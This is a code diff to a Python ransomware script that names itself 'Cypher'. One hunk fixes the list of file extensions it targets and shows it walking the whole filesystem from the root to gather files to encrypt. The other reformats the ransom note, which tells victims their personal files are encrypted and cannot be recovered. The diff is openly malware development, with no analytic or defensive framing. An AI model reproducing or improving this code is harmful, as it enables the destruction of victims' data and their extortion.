@@ -97,7 +97,7 @@ def selectfiles():
            ".m2ts", ".mkv", ".mov", ".mp4", ".mpg", ".mpeg",
            ".rm", ".swf", ".vob", ".wmv" ".docx", ".pdf",".rar",
            ".jpg",".jpeg",".png", ".tiff", ".zip", ".7z", ".exe", 
-           ".tar.gz", "tar", ".mp3", ".sh", ".c", ".h", ".txt"]
+           ".tar.gz", ".tar", ".mp3", ".sh", ".c", ".h", ".txt"]
            
     files_to_enc = []
     for root, dirs, files in os.walk("/"):
@@ -127,8 +127,10 @@ def note():
 	
 	
 	
-	Hello, unfortunately all your personal files have been encrypted with millitary grade encryption and will be impossible to retrieve
-	without aquiring the encryption key and decrypting binary. As of yet these are not available to you since the Cypher ransomware is still under construction. We thank you for your patience.
+	Hello, unfortunately all your personal files have been encrypted with millitary grade encryption and will be impossible
+	to retrieve without aquiring the encryption key and decrypting binary. 
+	As of yet these are not available to you since the Cypher ransomware is still under construction. 
+	We thank you for your patience.
 
 	Have a nice day,
 
